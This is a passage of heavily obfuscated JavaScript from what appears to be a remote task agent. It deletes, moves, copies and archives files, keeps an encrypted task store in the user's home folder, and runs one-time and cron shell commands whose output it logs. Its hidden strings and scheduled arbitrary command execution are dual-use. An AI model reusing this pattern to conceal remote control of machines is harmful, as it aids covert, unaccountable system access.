        const d = a0l[eo(0x4c6)](c), f = await a0l[eo(0x8d9)][eo(0x1db)](c);
        return {
            'path': a0o[eo(0x32d)](a0P['FILE_ROOT'], c),
            'content': f,
            'size': d[eo(0x9e0)]
        };
    }
    static async ['deleteFiles'](a) {
        const ep = a0c4, b = {
                'knQZt': ep(0xbc2),
                'LvgMH': ep(0xa75),
                'dkqbm': ep(0x823),
                'HcfNS': ep(0xbb0)
            }, c = [];
        for (const d of a) {
            const f = a0o['resolve'](a0P[ep(0x37b)], d);
            if (!a0a2(f)) {
                c['push']({
                    'path': d,
                    'status': b[ep(0x59b)]
                });
                continue;
            }
            try {
                if (a0l[ep(0xc2f)](f)) {
                    const g = a0l[ep(0x4c6)](f);
                    g['isDirectory']() ? a0l[ep(0x1f3)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c['push']({
                        'path': d,
                        'status': b[ep(0x83a)]
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': b['dkqbm']
                    });
            } catch (h) {
                c[ep(0x21f)]({
                    'path': d,
                    'status': b[ep(0x2ca)],
                    'message': h[ep(0x1f1)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const eq = a0c4, b = {
                'guNcJ': eq(0xbc2),
                'AhSAP': 'error'
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0o[eq(0xa50)](a0P[eq(0x37b)], d), h = a0o[eq(0xa50)](a0P[eq(0x37b)], f);
            if (!a0a2(g) || !a0a2(h)) {
                c[eq(0x21f)]({
                    'from': d,
                    'to': f,
                    'status': b[eq(0x852)]
                });
                continue;
            }
            try {
                const i = a0o[eq(0x3b8)](h);
                !a0l[eq(0xc2f)](i) && a0l[eq(0xb8d)](i, { 'recursive': !![] }), a0l[eq(0x2cc)](g, h), c[eq(0x21f)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[eq(0x21f)]({
                    'from': d,
                    'to': f,
                    'status': b['AhSAP'],
                    'message': j[eq(0x1f1)]
                });
            }
        }
        return c;
    }
    static async [a0c4(0x201)](a) {
        const er = a0c4, b = {
                'KnCXi': function (d, f, g) {
                    return d(f, g);
                },
                'eXEHP': er(0x823),
                'qJyYV': er(0xbb0)
            }, c = [];
        for (const [d, f] of Object[er(0x90c)](a)) {
            const g = a0o['resolve'](a0P[er(0x37b)], d), h = a0o['resolve'](a0P[er(0x37b)], f);
            if (!a0a2(g) || !a0a2(h)) {
                c[er(0x21f)]({
                    'from': d,
                    'to': f,
                    'status': er(0xbc2)
                });
                continue;
            }
            try {
                if (!a0l[er(0xc2f)](g)) {
                    c[er(0x21f)]({
                        'from': d,
                        'to': f,
                        'status': b[er(0x9fc)]
                    });
                    continue;
                }
                const i = a0o['dirname'](h);
                !a0l[er(0xc2f)](i) && a0l[er(0xb8d)](i, { 'recursive': !![] });
                const j = a0l[er(0x4c6)](g);
                if (j[er(0x39a)]()) {
                    if (a0l[er(0x8eb)])
                        a0l[er(0x8eb)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const es = er;
                            if (a0l['statSync'](l)['isDirectory']()) {
                                if (!a0l['existsSync'](m))
                                    a0l[es(0xb8d)](m, { 'recursive': !![] });
                                for (const n of a0l[es(0x2d8)](l)) {
                                    b['KnCXi'](k, a0o[es(0x6e5)](l, n), a0o[es(0x6e5)](m, n));
                                }
                            } else
                                a0l[es(0x5c6)](l, m);
                        };
                        b[er(0xc33)](k, g, h);
                    }
                } else
                    a0l[er(0x5c6)](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[er(0x21f)]({
                    'from': d,
                    'to': f,
                    'status': b[er(0x6bc)],
                    'message': l[er(0x1f1)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const et = a0c4, b = {
                'QDeES': function (d, f) {
                    return d(f);
                },
                'OYzOS': et(0x420)
            }, c = a0o[et(0xa50)](a0P['FILE_ROOT'], a);
        if (!b[et(0xa6a)](a0a2, c))
            throw new Error(b[et(0x75b)]);
        return a0l[et(0xb8d)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o['relative'](a0P['FILE_ROOT'], c)
        };
    }
    static [a0c4(0x973)](a) {
        const eu = a0c4;
        return a0o[eu(0x32d)](a0P[eu(0x37b)], a) || '.';
    }
    static async [a0c4(0xb04)](a, b, c = ![]) {
        const ev = a0c4, d = {
                'fCLnn': function (k, l, m) {
                    return k(l, m);
                },
                'mOdWd': function (k, l) {
                    return k === l;
                },
                'Eiqni': ev(0x82a),
                'ffdLU': function (k, l) {
                    return k(l);
                },
                'nXpCU': ev(0x420),
                'VtQQG': function (k, l) {
                    return k || l;
                },
                'atmHX': function (k, l) {
                    return k(l);
                },
                'cbvCf': ev(0xbb0),
                'toTEb': function (k, l, m) {
                    return k(l, m);
                },
                'DWeZU': ev(0x9d3)
            };
        if (!a)
            throw new Error(ev(0xd73));
        if (!Array[ev(0xb8b)](b) || d['mOdWd'](b[ev(0xcfc)], 0x0))
            throw new Error(d[ev(0x204)]);
        const f = a0o[ev(0xa50)](a0P[ev(0x37b)], a);
        if (!d[ev(0x44c)](a0a2, f))
            throw new Error(d[ev(0x97f)]);
        if (a0l['existsSync'](f) && a0l[ev(0x4c6)](f)[ev(0x39a)]())
            throw new Error(ev(0x7c4) + a);
        a0l['mkdirSync'](a0o['dirname'](f), { 'recursive': !![] });
        if (a0l[ev(0xc2f)](f))
            a0l[ev(0x53d)](f);
        const g = a0a3[ev(0x502)](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h['push']({
                    'item': k,
                    'status': ev(0x48a),
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[ev(0xa50)](a0P['FILE_ROOT'], d[ev(0x542)](k, ''));
            try {
                if (!d['atmHX'](a0a2, l)) {
                    h[ev(0x21f)]({
                        'item': k,
                        'status': d[ev(0x4f3)],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[ev(0xc2f)](l)) {
                    h['push']({
                        'item': k,
                        'status': ev(0x823),
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[ev(0x4c6)](l);
                let n = 0x0, o = ![];
                if (m[ev(0x43a)]()) {
                    if (!g[ev(0xa29)](a0o[ev(0xda0)](l), a0l['readFileSync'](l), m['mtime'])) {
                        j = !![], h[ev(0x21f)]({
                            'item': k,
                            'status': ev(0x48a),
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[ev(0x39a)]()) {
                        const p = a0o['basename'](l), q = (r, s) => {
                                const ew = ev;
                                for (const t of a0l[ew(0x2d8)](r)) {
                                    const u = a0o['join'](r, t), v = s ? s + '/' + t : t, w = a0l[ew(0x4c6)](u);
                                    if (w[ew(0x39a)]()) {
                                        if (!g[ew(0xa29)](v + '/', Buffer[ew(0x9b5)](0x0), w[ew(0x1d8)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        d[ew(0xbf9)](q, u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w['isFile']()) {
                                            if (!g[ew(0xa29)](v, a0l[ew(0xcda)](u), w[ew(0x1d8)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d[ev(0xc30)](q, l, c ? '' : p);
                    } else {
                        h['push']({
                            'item': k,
                            'status': d[ev(0x4f3)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h['push']({
                        'item': k,
                        'status': d[ev(0x4bc)],
                        'added': n
                    });
                    continue;
                }
                i += n, h['push']({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h['push']({
                    'item': k,
                    'status': d[ev(0x4f3)],
                    'added': 0x0
                });
            }
        }
        return g['close'](), {
            'status': 'ok',
            'path': a0a4['_displayPath'](f),
            'entries': i,
            'size': a0l['existsSync'](f) ? a0l[ev(0x4c6)](f)[ev(0x9e0)] : 0x0,
            'results': h
        };
    }
    static async [a0c4(0xc7d)](a, b, c = !![], d = null) {
        const ex = a0c4, f = {
                'lVeBx': ex(0xd73),
                'uYIKj': function (p, q) {
                    return p(q);
                },
                'VhrcO': ex(0x420),
                'EmVdq': function (p, q) {
                    return p >= q;
                },
                'ALJVv': function (p, q) {
                    return p !== q;
                },
                'jFioE': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f[ex(0x78d)]);
        const g = a0o[ex(0xa50)](a0P[ex(0x37b)], a);
        if (!f[ex(0x1d3)](a0a2, g))
            throw new Error(f[ex(0x72a)]);
        if (!a0l[ex(0xc2f)](g))
            throw new Error(ex(0xbfb) + a);
        if (a0l[ex(0x4c6)](g)[ex(0x39a)]())
            throw new Error(ex(0x45d) + a);
        let h;
        if (b) {
            h = a0o['resolve'](a0P[ex(0x37b)], b);
            if (!a0a2(h))
                throw new Error(f['VhrcO']);
            if (a0l[ex(0xc2f)](h) && !a0l['statSync'](h)[ex(0x39a)]())
                throw new Error('Destination\x20is\x20a\x20file:\x20' + b);
        } else
            h = a0o['dirname'](g);
        a0l[ex(0xb8d)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0a3[ex(0xcf1)](g);
        } catch (p) {
            throw new Error(ex(0x2ee) + a);
        }
        const j = (d || [])[ex(0xaf5)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q['isDir'])
                continue;
            if (f['EmVdq'](k + l, a0a3['ZIP_MAX_ENTRIES']) || f[ex(0x68b)](m, a0a3['ZIP_MAX_TOTAL_BYTES'])) {
                l++;
                continue;
            }
            const r = q[ex(0x4c7)][ex(0x1ad)](/\\/g, '/');
            if (j[ex(0xcfc)]) {
                const v = r[ex(0x3ff)]('/')[ex(0x458)]();
                if (!j[ex(0x38b)](r) && !j[ex(0x38b)](v)) {
                    l++;
                    continue;
                }
            }
            if (q[ex(0x5b1)] || q['zip64'] || m + q['size'] > a0a3[ex(0x811)]) {
                l++;
                continue;
            }
            const s = a0o['resolve'](h, r), t = a0o[ex(0x32d)](h, s);
            if (t[ex(0x6ec)]('..') || a0o[ex(0x86e)](t)) {
                l++;
                continue;
            }
            if (!f[ex(0x1d3)](a0a2, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0a3[ex(0x992)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f[ex(0x67d)](a0a3[ex(0xc42)](u), q[ex(0x5d8)])) {
                l++;
                continue;
            }
            if (!c && a0l[ex(0xc2f)](s)) {
                l++;
                continue;
            }
            try {
                a0l['mkdirSync'](a0o[ex(0x3b8)](s), { 'recursive': !![] }), a0l[ex(0x7fe)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[ex(0x9e0)], f[ex(0xc2a)](n[ex(0xcfc)], a0a3[ex(0xc03)]) ? n[ex(0x21f)](a0a4['_displayPath'](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0a4['_displayPath'](g),
            'dest': a0a4[ex(0x973)](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0a5 {
    static [a0c4(0x848)] = a0c4(0xc45);
    static [a0c4(0x6ee)] = 0x1;
    static [a0c4(0xa67)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static [a0c4(0x98f)]() {
        const ey = a0c4;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[ey(0xc2f)](a))
                return a;
        }
        try {
            return a0p[ey(0x983)]() || process[ey(0x2cb)]();
        } catch (b) {
            return process['cwd']();
        }
    }
    static [a0c4(0x82e)](a) {
        const ez = a0c4, b = {
                'HgrDg': ez(0xd47),
                'JmCVz': function (c, d) {
                    return c === d;
                },
                'VGewU': ez(0x7be),
                'kVMLT': function (c, d) {
                    return c === d;
                }
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[ez(0x1d0)](a)) {
                const d = Buffer[ez(0x581)](a, b[ez(0xda6)]);
                return b[ez(0x2e3)](d[ez(0xcfc)], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[ez(0x1d0)](a))
                return null;
            const c = Buffer[ez(0x581)](a, b['VGewU']);
            return b[ez(0xaff)](c[ez(0xcfc)], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static ['init']() {
        const eA = a0c4, a = {
                'jpfHc': eA(0xd46),
                'rTIAa': 'false',
                'ZMuwj': eA(0x742),
                'rUQmD': eA(0x65e),
                'MFiKQ': eA(0xcea),
                'xnShj': '[TaskStore]\x20💾\x20KSTORE_KEY\x20未设置,\x20任务持久化未启用'
            }, b = a0a5[eA(0xa67)];
        let c = (process.env.KSTORE || '')[eA(0x7e4)]();
        if ([
                a[eA(0x327)],
                '0',
                eA(0xcdb),
                a[eA(0x704)]
            ]['includes'](c[eA(0xc48)]()))
            return a0D[eA(0xb82)](a['ZMuwj']), b;
        const d = (process.env.KSTORE_KEY || '')[eA(0x7e4)]();
        !c && (c = a0o[eA(0x6e5)](a0a5[eA(0x98f)](), eA(0xc4e), a['rUQmD']));
        const f = a0a5['parseKey'](d);
        if (!f) {
            if (d)
                a0D['error'](a[eA(0x34a)]);
            else
                a0D[eA(0xb82)](a[eA(0xab0)]);
            return b;
        }
        return b[eA(0x5b0)] = c, b[eA(0x577)] = f, b[eA(0x57c)] = !![], a0D[eA(0xb82)]('[TaskStore]\x20💾\x20任务持久化已启用:\x20' + b[eA(0x5b0)]), b;
    }
    static ['encrypt'](a, b) {
        const eB = a0c4, c = {
                'VTtft': 'aes-256-gcm',
                'KChac': eB(0x1bc),
                'COvoC': eB(0x7be)
            }, d = a0k['randomBytes'](0xc), f = a0k[eB(0x512)](c[eB(0x511)], a, d), g = Buffer[eB(0x6ef)]([
                f['update'](Buffer[eB(0x581)](b, c[eB(0x953)])),
                f[eB(0x6c9)]()
            ]), h = {
                'nonce': d[eB(0xa3c)](c['COvoC']),
                'tag': f[eB(0xb8f)]()[eB(0xa3c)](c['COvoC']),
                'ciphertext': g[eB(0xa3c)](c[eB(0x925)])
            };
        return Buffer[eB(0x581)](JSON[eB(0x8f7)](h), c[eB(0x953)])['toString'](c[eB(0x925)]);
    }
    static [a0c4(0xd51)](a, b) {
        const eC = a0c4, c = {
                'gzLFw': 'base64',
                'JsMCT': eC(0xbc0),
                'uGxJy': eC(0x1bc)
            }, d = JSON['parse'](Buffer['from'](b, c[eC(0xc3d)])[eC(0xa3c)]('utf8'));
        if (!d['nonce'] || !d[eC(0x591)] || !d['ciphertext'])
            throw new Error(c[eC(0x9bd)]);
        const f = a0k[eC(0x54c)](eC(0x6a8), a, Buffer[eC(0x581)](d[eC(0xadd)], c[eC(0xc3d)]));
        return f[eC(0x20f)](Buffer[eC(0x581)](d['tag'], c[eC(0xc3d)])), Buffer['concat']([
            f[eC(0x954)](Buffer[eC(0x581)](d[eC(0x8e8)], c[eC(0xc3d)])),
            f[eC(0x6c9)]()
        ])[eC(0xa3c)](c['uGxJy']);
    }
    static [a0c4(0x74c)]() {
        const eD = a0c4, a = {
                'rbDlN': function (c, d, f) {
                    return c(d, f);
                },
                'xZDjH': function (c, d) {
                    return c > d;
                },
                'jtBAe': function (c, d) {
                    return c !== d;
                },
                'koeza': function (c, d) {
                    return c(d);
                },
                'kcMhX': function (c, d) {
                    return c(d);
                }
            }, b = a0a5[eD(0xa67)];
        if (!b[eD(0x57c)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[eD(0xc2f)](b[eD(0x5b0)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[eD(0xcda)](b['path'], eD(0x1bc))[eD(0x7e4)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON['parse'](a0a5[eD(0xd51)](b['key'], c));
            } catch (j) {
                throw new Error('解密失败\x20(密钥错误或数据被篡改):\x20' + j['message']);
            }
            if (!d || d[eD(0xc6d)] !== a0a5['MAGIC'])
                throw new Error('magic\x20不匹配');
            const f = a[eD(0x330)](parseInt, d[eD(0xb72)], 0xa) || 0x0;
            if (a[eD(0x7e3)](f, a0a5['VERSION']))
                return b[eD(0x4fa)] = !![], a0D[eD(0xbb0)]('[TaskStore]\x20❌\x20存储版本\x20' + f + '\x20高于支持版本\x20' + a0a5[eD(0x6ee)] + eD(0x643)), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['jtBAe'](f, a0a5[eD(0x6ee)]))
                throw new Error('不支持的版本\x20' + f);
            const g = d[eD(0x369)] || {};
            b[eD(0x78b)] = d[eD(0x1d6)] || null;
            const h = Array[eD(0xb8b)](g[eD(0xc34)]) ? g['onetasks'][eD(0x922)](String) : [], i = {};
            for (const [l, m] of Object['entries'](g['crontasks'] || {}))
                i[a[eD(0xd4b)](String, l)] = a[eD(0x3ca)](String, m);
            return a0D[eD(0xb82)](eD(0x272) + h[eD(0xcfc)] + ',\x20cron=' + Object[eD(0xa7e)](i)['length']), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0a5[eD(0x1da)]('加载失败:\x20' + n[eD(0x1f1)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static ['quarantine'](a) {
        const eE = a0c4;
        try {
            const b = a0a5['state'];
            if (b[eE(0x5b0)] && a0l[eE(0xc2f)](b['path'])) {
                const c = b[eE(0x5b0)] + eE(0x7a8) + Date[eE(0x2a3)]();
                a0l[eE(0x2cc)](b[eE(0x5b0)], c), a0D[eE(0xbb0)](eE(0x74b) + a + eE(0xb3f) + c);
            } else
                a0D[eE(0xbb0)](eE(0x74b) + a);
        } catch (d) {
            a0D['error'](eE(0x74b) + a + eE(0x3c8) + d[eE(0x1f1)]);
        }
    }
    static [a0c4(0xb36)](a, b) {
        const eF = a0c4, c = { 'TmRCE': 'utf8' }, d = a0a5[eF(0xa67)];
        if (!d[eF(0x57c)] || d[eF(0x4fa)])
            return ![];
        let f = null;
        try {
            const g = {
                    'magic': a0a5[eF(0x848)],
                    'version': a0a5[eF(0x6ee)],
                    'saved_at': new Date()[eF(0xb63)]()['replace'](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, h = a0a5['encrypt'](d[eF(0x577)], JSON['stringify'](g));
            return a0l[eF(0xb8d)](a0o[eF(0x3b8)](d[eF(0x5b0)]), { 'recursive': !![] }), f = d[eF(0x5b0)] + eF(0x970) + process[eF(0xa57)], a0l[eF(0x7fe)](f, h, c[eF(0x6e0)]), a0l[eF(0x2cc)](f, d[eF(0x5b0)]), d[eF(0x78b)] = g[eF(0x1d6)], !![];
        } catch (i) {
            a0D['error'](eF(0x701) + i[eF(0x1f1)]);
            try {
                if (f && a0l['existsSync'](f))
                    a0l[eF(0x53d)](f);
            } catch (j) {
            }
            return ![];
        }
    }
}
class a0a6 {
    static [a0c4(0xda4)] = new Map();
    static [a0c4(0xb75)](a, b) {
        const eG = a0c4, c = {
                'gZLtY': function (d, f) {
                    return d > f;
                }
            };
        a[eG(0x21f)](b), c['gZLtY'](a['length'], a0P[eG(0xc89)]) && a[eG(0xb88)](0x0, a[eG(0xcfc)] - a0P[eG(0xc89)]);
    }
    static [a0c4(0x63e)](a, b, c, d, f = null) {
        const eH = a0c4, g = new Date()['toISOString']();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + eH(0xa98) + a + eH(0xc62) + c + '\x0a' + (b?.[eH(0x7e4)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const eI = a0c4;
        return {
            'status': 'ok',
            'count': a0P[eI(0xc34)][eI(0xcfc)],
            'tasks': a0P[eI(0xc34)]
        };
    }
    static ['taskMetaLineRe'] = /^\s*(?:#|rem\b)\s*kisama-task:\s*(.*)$/i;
    static [a0c4(0xc7b)](a) {
        const eJ = a0c4, b = {
                'ygCaY': function (d, f) {
                    return d(f);
                },
                'jBtgN': function (d, f) {
                    return d ?? f;
                },
                'MkGOL': function (d, f) {
                    return d(f);
                }
            }, c = b[eJ(0xa84)](String, b[eJ(0xa30)](a, ''))[eJ(0x3ff)]('\x0a')[eJ(0xa40)](0x0, 0x3);
        for (const d of c) {
            const f = a0a6[eJ(0xcef)][eJ(0xd75)](d);
            if (!f)
                continue;
            const g = /\bid=(\d+)\b/[eJ(0xd75)](f[0x1])?.[0x1];
            if (!g)
                return null;
            const h = b['MkGOL'](Number, /\bupdated=(\d+)\b/[eJ(0xd75)](f[0x1])?.[0x1] || 0x0);
            return {
                'id': g,
                'updated': h
            };
        }
        return null;
    }
    static [a0c4(0x24b)](a) {
        const eK = a0c4, b = {
                'VZNJQ': function (d, f) {
                    return d(f);
                },
                'RNTTa': function (d, f) {
                    return d ?? f;
                },
                'Ohuut': function (d, f) {
                    return d < f;
                },
                'uaAXT': function (d, f) {
                    return d + f;
                }
            }, c = b['VZNJQ'](String, b[eK(0xccc)](a, ''))[eK(0x3ff)]('\x0a');
        for (let d = 0x0; b[eK(0x567)](d, Math['min'](0x3, c[eK(0xcfc)])); d++) {
            if (a0a6[eK(0xcef)][eK(0x1d0)](c[d]))
                return [
                    ...c['slice'](0x0, d),
                    ...c[eK(0xa40)](b[eK(0x90e)](d, 0x1))
                ][eK(0x6e5)]('\x0a');
        }
        return b['VZNJQ'](String, b[eK(0xccc)](a, ''));
    }
    static [a0c4(0xb81)](a, b, c) {
        const eL = a0c4, d = {
                'SnyTI': function (j, k) {
                    return j === k;
                },
                'IbXoo': 'win32',
                'weqfP': eL(0xa1d)
            }, f = a0a6[eL(0x24b)](a), g = d['SnyTI'](process[eL(0x2fb)], d['IbXoo']) ? d[eL(0x60d)] : '#', h = g + '\x20kisama-task:\x20id=' + b + eL(0x6d0) + c, i = f['split']('\x0a');
        return i[eL(0xb88)](i[0x0]?.[eL(0x6ec)]('#!') ? 0x1 : 0x0, 0x0, h), i['join']('\x0a');
    }
    static [a0c4(0x53b)](a, b) {
        const eM = a0c4, c = {
                'xSLoi': function (j, k) {
                    return j(k);
                },
                'JgmWA': function (j, k) {
                    return j(k);
                },
                'KLnRv': function (j, k) {
                    return j < k;
                },
                'eBwmS': function (j, k) {
                    return j === k;
                }
            }, d = Date[eM(0x2a3)](), f = j => (j || [])[eM(0x922)](k => ({
                'raw': String(k ?? ''),
                'meta': a0a6[eM(0xc7b)](k),
                'eff': a0a6[eM(0x24b)](k)[eM(0x7e4)]()
            })), g = c[eM(0x60c)](f, b), h = new Set(), i = [];
        for (const {
                    raw: j,
                    meta: k,
                    eff: l
                } of c['JgmWA'](f, a)) {
            let m = -0x1;
            k && (m = g[eM(0xb26)]((p, q) => !h[eM(0xa3d)](q) && p[eM(0x32f)] && p[eM(0x32f)]['id'] === k['id']));
            m < 0x0 && (m = g[eM(0xb26)]((p, q) => !h[eM(0xa3d)](q) && p[eM(0x964)] === l && (!k || !p[eM(0x32f)])));
            if (c['KLnRv'](m, 0x0)) {
                i[eM(0x21f)](a0a6[eM(0xb81)](l, String(d), d));
                continue;
            }
            const n = g[m];
            h[eM(0xa29)](m);
            if (c[eM(0x664)](n['eff'], l)) {
                n[eM(0x32f)] ? i[eM(0x21f)](a0a6[eM(0xb81)](n['raw'], n[eM(0x32f)]['id'], n[eM(0x32f)]['updated'])) : i[eM(0x21f)](a0a6[eM(0xb81)](n['raw'], k ? k['id'] : c[eM(0x60c)](String, d), k && k[eM(0xc22)] ? k['updated'] : d));
                continue;
            }
            const o = n[eM(0x32f)] ? n['meta']['id'] : k ? k['id'] : c['JgmWA'](String, d);
            i[eM(0x21f)](a0a6[eM(0xb81)](l, o, d));
        }
        return i;
    }
    static [a0c4(0x51a)](a, b) {
        const eN = a0c4, c = {
                'ZOPob': function (j, k) {
                    return j < k;
                },
                'tkFIG': function (j, k) {
                    return j(k);
                },
                'pXJVi': function (j, k) {
                    return j === k;
                }
            }, d = Date['now'](), f = ([j, k]) => ({
                'expr': String(j),
                'raw': String(k ?? ''),
                'meta': a0a6[eN(0xc7b)](k),
                'eff': a0a6[eN(0x24b)](k)[eN(0x7e4)]()
            }), g = Object['entries'](b || {})['map'](f), h = new Set(), i = {};
        for (const {
                    expr: j,
                    raw: k,
                    meta: l,
                    eff: m
                } of Object['entries'](a || {})[eN(0x922)](f)) {
            let n = -0x1;
            l && (n = g[eN(0xb26)]((q, r) => !h['has'](r) && q[eN(0x32f)] && q['meta']['id'] === l['id']));
            n < 0x0 && (n = g[eN(0xb26)]((q, r) => !h['has'](r) && q[eN(0xb90)] === j && q[eN(0x964)] === m && (!l || !q[eN(0x32f)])));
            if (c[eN(0x1f2)](n, 0x0)) {
                i[j] = a0a6['withTaskMeta'](m, c['tkFIG'](String, d), d);
                continue;
            }
            const o = g[n];
            h[eN(0xa29)](n);
            if (o[eN(0x964)] === m && c[eN(0xaaf)](o['expr'], j)) {
                o['meta'] ? i[j] = a0a6[eN(0xb81)](o['raw'], o['meta']['id'], o[eN(0x32f)][eN(0xc22)]) : i[j] = a0a6['withTaskMeta'](o[eN(0xda8)], l ? l['id'] : String(d), l && l[eN(0xc22)] ? l[eN(0xc22)] : d);
                continue;
            }
            const p = o['meta'] ? o['meta']['id'] : l ? l['id'] : String(d);
            i[j] = a0a6[eN(0xb81)](m, p, d);
        }
        return i;
    }
    static async [a0c4(0xa35)](a) {
        const eO = a0c4, b = {
                'OTaQp': function (d, f) {
                    return d > f;
                },
                'cuMKI': function (d, f) {
                    return d > f;
                },
                'NGhss': eO(0xc09),
                'rebmq': eO(0xbb0)
            };
        a0P[eO(0xc34)] = a && b[eO(0x5e5)](a['length'], 0x0) ? a0a6[eO(0x53b)](a, a0P['onetasks']) : [];
        const c = [];
        if (a0P[eO(0x239)] && b['cuMKI'](a0P['onetasks'][eO(0xcfc)], 0x0)) {
            for (let d = 0x0; d < a0P['onetasks'][eO(0xcfc)]; d++) {
                const f = a0P[eO(0xc34)][d], g = await a0a1[eO(0x5ea)](f), h = this[eO(0x63e)](f, g[eO(0xa5f)], g[eO(0x3de)], b['NGhss']);
                this[eO(0xb75)](a0P[eO(0x26b)], h), c[eO(0x21f)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[eO(0x3de)],
                    'output': g[eO(0xa5f)],
                    'status': g[eO(0x3de)] === 0x0 ? 'ok' : b[eO(0x5aa)]
                });
            }
            a0P[eO(0x239)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0P[eO(0xc34)]['length'],
            'tasks': a0P[eO(0xc34)],
            'executed': c,
            'persisted': a0a5['save'](a0P[eO(0xc34)], a0P[eO(0xbbc)])
        };
    }
    static [a0c4(0x7c6)]() {
        const eP = a0c4;
        return {
            'status': 'ok',
            'count': Object[eP(0xa7e)](a0P['crontasks'])[eP(0xcfc)],
            'tasks': a0P[eP(0xbbc)]
        };
    }
    static [a0c4(0xbf8)](a) {
        const eQ = a0c4, b = {
                'QAOoH': function (d, f) {
                    return d === f;
                },
                'BWhHx': eQ(0xacb),
                'zQoAx': function (d, f) {
                    return d === f;
                },
                'QduTn': 'cron',
                'AchMx': function (d, f) {
                    return d > f;
                },
                'UigYp': eQ(0xbb0),
                'GUhGy': function (d, f) {
                    return d - f;
                },
                'xMnNN': function (d, f) {
                    return d > f;
                }
            };
        this[eQ(0xda4)][eQ(0x982)](d => {
            const eR = eQ;
            b[eR(0xb76)](typeof d[eR(0x87d)], b[eR(0x59d)]) && d[eR(0x87d)](), b[eR(0x9cf)](typeof d[eR(0x4b0)], eR(0xacb)) && d[eR(0x4b0)]();
        }), this[eQ(0xda4)][eQ(0xcc9)]();
        const c = [];
        for (const d of Object['keys'](a || {})) {
            !a0t[eQ(0xd80)](d) && c['push'](d);
        }
        if (b['AchMx'](c[eQ(0xcfc)], 0x0))
            return {
                'status': b[eQ(0x5af)],
                'message': eQ(0x615) + c[eQ(0x6e5)](',\x20'),
                'valid_count': b[eQ(0x4fd)](Object['keys'](a || {})['length'], c[eQ(0xcfc)])
            };
        a0P[eQ(0xbbc)] = a && Object['keys'](a)['length'] > 0x0 ? a0a6[eQ(0x51a)](a, a0P[eQ(0xbbc)]) : {};
        for (const [f, g] of Object['entries'](a0P[eQ(0xbbc)])) {
            const h = a0t[eQ(0x4da)](f, async () => {
                const eS = eQ, i = await a0a1[eS(0x5ea)](g), j = this[eS(0x63e)](g, i[eS(0xa5f)], i[eS(0x3de)], b[eS(0x5dc)], f);
                this[eS(0xb75)](a0P['crontasks_log'], j);
            });
            this['cronJobs'][eQ(0x9fe)](f, h);
        }
        return a0P[eQ(0x77c)] = b[eQ(0x7ce)](Object['keys'](a0P[eQ(0xbbc)])[eQ(0xcfc)], 0x0), {
            'status': 'ok',
            'count': Object[eQ(0xa7e)](a0P[eQ(0xbbc)])['length'],
            'tasks': a0P[eQ(0xbbc)],
            'persisted': a0a5['save'](a0P['onetasks'], a0P['crontasks'])
        };
    }
    static [a0c4(0x40c)]() {
        const eT = a0c4;
        return {
            'onetime': {
                'pending': a0P[eT(0x239)],
                'count': a0P[eT(0xc34)][eT(0xcfc)]
            },
            'cron': {
                'active': a0P['cronloop'],
                'count': Object[eT(0xa7e)](a0P[eT(0xbbc)])[eT(0xcfc)],
                'check_interval': a0P['CRON_CHECK_INTERVAL']
            },
            'persistence': {
                'enabled': a0a5['state'][eT(0x57c)],
                'store_path': a0a5['state'][eT(0x5b0)],
                'last_saved_at': a0a5['state'][eT(0x78b)]
            }
        };
    }
    static [a0c4(0xbaf)](a = 0x32) {
        const eU = a0c4, b = a0P[eU(0x26b)][eU(0xa40)](-a);
        return {
